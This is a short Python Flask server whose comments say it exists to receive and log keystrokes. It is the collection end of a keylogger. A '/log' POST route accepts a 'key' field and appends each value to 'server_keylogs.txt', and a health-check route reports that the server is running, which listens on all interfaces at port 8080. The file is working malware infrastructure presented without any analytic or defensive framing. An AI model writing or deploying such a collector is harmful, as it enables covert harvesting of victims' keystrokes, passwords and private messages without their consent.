from flask import Flask, request
import logging
import os

app = Flask(__name__)

# Set up logging
log_file = "server_keylogs.txt"
if not os.path.exists(log_file):
    open(log_file, 'w').close()

logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Route to receive and log the keystrokes
@app.route('/log', methods=['POST'])
def log_data():
    key_logs = request.form.get('key')
    
    if key_logs:
        try:
            # Log the received key logs
            with open(log_file, 'a') as f:
                f.write(f"{key_logs}\n")
            return 'Keys logged successfully!', 200
        except Exception as e:
            logging.error(f"Failed to write log: {e}")
            return f"Failed to write log: {e}", 500
    else:
        return 'No key data received.', 400

# Health check endpoint for monitoring server status
@app.route('/health', methods=['GET'])
def health_check():
    return 'Server is running', 200

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8080)
